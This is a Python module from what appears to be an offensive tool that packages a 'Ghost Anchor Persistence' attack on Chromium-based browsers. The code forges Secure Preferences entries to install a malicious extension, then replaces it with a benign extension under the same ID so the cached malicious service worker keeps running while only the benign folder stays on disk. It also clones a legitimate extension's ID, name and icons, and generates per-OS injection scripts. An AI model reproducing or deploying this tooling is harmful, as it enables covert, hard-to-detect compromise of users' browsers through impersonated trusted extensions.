"""
gap_package.py - GAP (Ghost Anchor Persistence) packaging.

Builds a deployment ZIP that reproduces the GAP infection chain on the target:

  1. Deploy malicious extension A (Secure Preferences -> A's folder)
  2. Open/close the browser -> A's service worker is cached in ScriptCache
  3. Stomp with benign extension B (Secure Preferences -> B's folder, same ID)
  4. Remove A's folder -> only the benign folder remains on disk

The two Secure Preferences files are both generated from the SAME clean preferences input, so each injection starts from a clean state.
"""

import datetime
import json
import os
import shutil
import tempfile
import zipfile

from .browser_config import BrowserConfigurator
from .builder import build_secure_preferences

# One injection-script template per target OS (parity with stomp).
INJECT_TEMPLATES = {
    "windows": os.path.join(os.path.dirname(__file__), "inject.bat.template"),
    "darwin":  os.path.join(os.path.dirname(__file__), "inject.darwin.sh.template"),
    "linux":   os.path.join(os.path.dirname(__file__), "inject.linux.sh.template"),
}


def _load_manifest(ext_dir: str) -> dict:
    with open(os.path.join(ext_dir, "manifest.json"), "r", encoding="utf-8") as f:
        return json.load(f)


def resolve_shared_key(
    malicious_dir: str,
    benign_dir: str,
    spoof_id: str | None = None,
    browser: str = "edge",
    proxy: str | None = None,
    fixed_key: str | None = None,
) -> tuple[str | None, str | None]:
    """
    Guarantee that both extensions carry the SAME `key` (hence the same ID).

    Order of precedence:
      1. --spoof <id>     : fetch the whitelisted key, patch BOTH manifests.
      2. same key in both : reuse it.
      3. key in one only  : propagate it to the other.
      4. no key at all    : generate one, inject it into both.

    Returns (crx_id, public_key_b64); (None, None) on failure.
    """
    import base64

    from .crypto import generate_extension_keys
    from .manifest import fetch_spoof_package, key_to_crx_id, patch_manifest, apply_spoof_metadata

    if fixed_key:
        return _apply_fixed_key(malicious_dir, benign_dir, fixed_key)

    if spoof_id:
        print(f"[*] Spoofing ID {spoof_id} -> applying name/ID/description/icons to both")
        pub_key, crx_data = fetch_spoof_package(spoof_id, browser, proxy=proxy)
        if not pub_key:
            print("[-] Could not retrieve public key for spoofed ID - aborting.")
            return None, None
        for d in (malicious_dir, benign_dir):
            patch_manifest(d, pub_key)             # -> 决定扩展 ID
            apply_spoof_metadata(d, crx_data)      # -> 名字 / 描述 / 图标
        crx_id = key_to_crx_id(base64.b64decode(pub_key))
        print(f"[+] Both extensions now share the spoofed ID: {crx_id} (identity cloned)")
        return crx_id, pub_key

    ma = _load_manifest(malicious_dir)
    mb = _load_manifest(benign_dir)
    key_a = ma.get("key")
    key_b = mb.get("key")

    # Both already have a key -> they must match.
    if key_a and key_b:
        if key_a != key_b:
            print("[-] The two manifests carry different keys - GAP requires a single shared ID.")
            return None, None
        crx_id = key_to_crx_id(base64.b64decode(key_a))
        print(f"[*] Both extensions already share the same key -> ID: {crx_id}")
        return crx_id, key_a

    # Only one has a key -> propagate it to the other.
    shared = key_a or key_b
    if shared:
        crx_id = key_to_crx_id(base64.b64decode(shared))
        for d, m in ((malicious_dir, ma), (benign_dir, mb)):
            if "key" not in m:
                m["key"] = shared
                with open(os.path.join(d, "manifest.json"), "w", encoding="utf-8") as f:
                    json.dump(m, f, indent=2, ensure_ascii=False)
                print(f"[+] Injected shared key into {os.path.basename(d)} -> ID: {crx_id}")
        return crx_id, shared

    # No key at all -> generate one and inject it into both.
    crx_id, pub_key, _ = generate_extension_keys()
    for d, m in ((malicious_dir, ma), (benign_dir, mb)):
        m["key"] = pub_key
        with open(os.path.join(d, "manifest.json"), "w", encoding="utf-8") as f:
            json.dump(m, f, indent=2, ensure_ascii=False)
    print(f"[+] Generated a new shared key -> ID: {crx_id}")
    return crx_id, pub_key


def gap_package(
    malicious_dir: str,
    benign_dir: str,
    crx_id: str,
    prefs_file: str,
    device_id: str,
    target_dir: str,
    browser_id: str,
    platform: str = "windows",
    output_dir: str | None = None,
    debug: bool = False,
    folder_name: str | None = None,
) -> str | None:
    """
    Build the GAP deployment ZIP. Returns the ZIP path, or None on failure.
    """
    # __ Validate inputs ____________________________________________
    for label, d in (("malicious", malicious_dir), ("benign", benign_dir)):
        if not os.path.isdir(d):
            print(f"[-] {label} extension directory not found: {d}")
            return None
        if not os.path.exists(os.path.join(d, "manifest.json")):
            print(f"[-] manifest.json not found in {label} directory: {d}")
            return None
    if not os.path.exists(prefs_file):
        print(f"[-] Preferences file not found: {prefs_file}")
        return None

    cfg = BrowserConfigurator.get_browser_configs(platform).get(browser_id)
    if cfg is None:
        print(f"[-] Unknown browser: {browser_id}")
        return None

    ma = _load_manifest(malicious_dir)
    mb = _load_manifest(benign_dir)

    # __ Deploy paths (target OS) ____________________________________
    sep = "\\" if platform == "windows" else "/"
    wrong_sep = "/" if platform == "windows" else "\\"
    target_dir = target_dir.replace(wrong_sep, sep).rstrip(sep)
    if folder_name:
        mal_name = ben_name = folder_name
    else:
        mal_name = os.path.basename(malicious_dir.rstrip("/\\"))
        ben_name = os.path.basename(benign_dir.rstrip("/\\"))
    deploy_path_a = f"{target_dir}{sep}{mal_name}"
    deploy_path_b = f"{target_dir}{sep}{ben_name}"
    print(f"[*] Deploy path A (malicious): {deploy_path_a}")
    print(f"[*] Deploy path B (benign)   : {deploy_path_b}")

    # __ Sanity: same background service worker filename required ______
    sw_a = (ma.get("background") or {}).get("service_worker")
    sw_b = (mb.get("background") or {}).get("service_worker")
    if sw_a and sw_b and sw_a != sw_b:
        print(f"[!] Warning: A and B declare different service worker files "
              f"('{sw_a}' vs '{sw_b}'). ScriptCache is indexed by script URL; "
              f"filenames MUST match for GAP persistence.")

    with open(prefs_file, "r", encoding="utf-8") as f:
        prefs_content = f.read()

    timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M")
    output_filename = f"gap_{crx_id}_{timestamp}"
    out_root = output_dir or "."
    os.makedirs(out_root, exist_ok=True)
    final_zip = os.path.join(out_root, output_filename + "_deploy.zip")

    # __ Build the two Secure Preferences files _______________________
    print(f"[*] Generating Secure Preferences A (malicious) for {cfg.name} ...")
    try:
        spf_a = build_secure_preferences(
            prefs_content=prefs_content,
            crx_id=crx_id,
            deploy_path=deploy_path_a,
            manifest=ma,
            device_id=device_id,
            browser_id=browser_id,
        )
        print(f"[*] Generating Secure Preferences B (benign) for {cfg.name} ...")
        spf_b = build_secure_preferences(
            prefs_content=prefs_content,
            crx_id=crx_id,
            deploy_path=deploy_path_b,
            manifest=mb,
            device_id=device_id,
            browser_id=browser_id,
        )
    except Exception as e:
        print(f"[-] Failed to build Secure Preferences: {e}")
        if debug:
            import traceback
            traceback.print_exc()
        return None

    with tempfile.TemporaryDirectory() as tmp:
        # Extension folders (contents copied directly, manifest already patched)
        shutil.copytree(malicious_dir, os.path.join(tmp, "extension_malicious"))
        shutil.copytree(benign_dir, os.path.join(tmp, "extension_benign"))

        # Two Secure Preferences variants at ZIP root
        with open(os.path.join(tmp, "Secure Preferences A"), "wb") as f:
            f.write(spf_a)
        with open(os.path.join(tmp, "Secure Preferences B"), "wb") as f:
            f.write(spf_b)

        # Injection script - platform-aware (windows / darwin / linux)
        script_content = _render_inject_script(cfg, target_dir, mal_name, ben_name, platform)
        script_name = "inject.bat" if platform == "windows" else "inject.sh"
        if script_content:
            script_path = os.path.join(tmp, script_name)
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)
            if platform != "windows":
                os.chmod(script_path, 0o755)
            print(f"[+] {script_name} generated")
        else:
            print(f"[~] {script_name} skipped (template not found)")

        # Original prefs backup
        shutil.copy2(prefs_file, os.path.join(tmp, "SecurePreferencesClean"))

        # info.json
        info = {
            "technique": "GAP - Ghost Anchor Persistence",
            "extension_id": crx_id,
            "timestamp": timestamp,
            "device_id": device_id,
            "browser": cfg.name,
            "platform": platform,
            "secure_preferences_path": cfg.secure_preferences_path,
            "malicious": {
                "name": mal_name,
                "local_path": malicious_dir,
                "deploy_path": deploy_path_a,
                "service_worker": sw_a,
            },
            "benign": {
                "name": ben_name,
                "local_path": benign_dir,
                "deploy_path": deploy_path_b,
                "service_worker": sw_b,
            },
        }
        with open(os.path.join(tmp, "info.json"), "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2)

        with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_DEFLATED) as zout:
            for root, _, files in os.walk(tmp):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    arcname = os.path.relpath(fpath, tmp)
                    zout.write(fpath, arcname)

    print(f"\n[+] ZIP created: {final_zip}")
    print_deploy_inventory(final_zip)
    return final_zip


def _render_inject_script(cfg, target_dir: str, mal_name: str, ben_name: str, platform: str) -> str | None:
    """Render the two-phase GAP injection script for the target platform."""
    template_path = INJECT_TEMPLATES.get(platform)
    if not template_path or not os.path.exists(template_path):
        print(f"[-] Injection template not found for platform '{platform}'")
        return None

    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    content = content.replace("{{BROWSER_NAME}}", cfg.name)
    content = content.replace("{{BROWSER_PROC_NAME}}", cfg.proc_name)
    content = content.replace("{{BROWSER_PROFILE_PATH}}", cfg.profile_path)
    content = content.replace("{{BROWSER_TARGET_DIR}}", target_dir)
    content = content.replace("{{MALICIOUS_NAME}}", mal_name)
    content = content.replace("{{BENIGN_NAME}}", ben_name)

    return content


def _apply_fixed_key(malicious_dir: str, benign_dir: str, pub_key: str):
    """把固定公钥写入 A、B 两个 manifest，得到稳定的自定义 ID。"""
    import base64
    from .manifest import key_to_crx_id, patch_manifest
    for d in (malicious_dir, benign_dir):
        patch_manifest(d, pub_key)
    crx_id = key_to_crx_id(base64.b64decode(pub_key))
    print(f"[+] 使用固定 key -> 自定义稳定 ID: {crx_id}（多次运行不变）")
    return crx_id, pub_key



def print_deploy_inventory(final_zip: str):
    """列出部署包内容，并确认里面只含公钥、绝不含私钥。"""
    import zipfile as _zip
    try:
        with _zip.ZipFile(final_zip) as z:
            names = sorted(z.namelist())
    except Exception as e:
        print(f"[-] 无法读取部署包清单: {e}")
        return
    print("\n" + "#" * 62)
    print("#  部署包文件清单（拷到目标机后就是这些）")
    print("#" * 62)
    for n in names:
        print("  -", n)
    # 私钥检测：常见私钥特征
    priv_hits = [n for n in names if n.lower().endswith((".pem", ".key"))
                 or ".pem" in n.lower() or ".key" in n.lower()]
    if priv_hits:
        print("\n[!] 注意：部署包中检测到可能存在私钥的文件:")
        for n in priv_hits:
            print("    -", n)
    else:
        print("\n[*] 部署包中不含任何私钥文件（.pem/.key）: 目标机只需公钥即可加载扩展。")
